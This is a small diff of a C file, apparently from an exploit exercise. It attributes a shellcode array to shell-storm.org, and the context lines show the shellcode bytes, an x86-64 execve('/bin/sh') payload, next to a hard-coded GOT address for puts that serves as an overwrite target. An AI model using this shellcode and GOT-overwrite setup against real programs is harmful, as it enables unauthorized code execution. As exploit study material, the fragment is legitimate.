@@ -17,7 +17,7 @@
 #include <stdint.h>
 #include <malloc.h>
 
-//char bss_var[] = "This is a string that we want to overwrite.";
+// Shell code by http://shell-storm.org/shellcode/files/shellcode-806.php
 char shell_code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
 unsigned long puts_got = 0x602020;
 
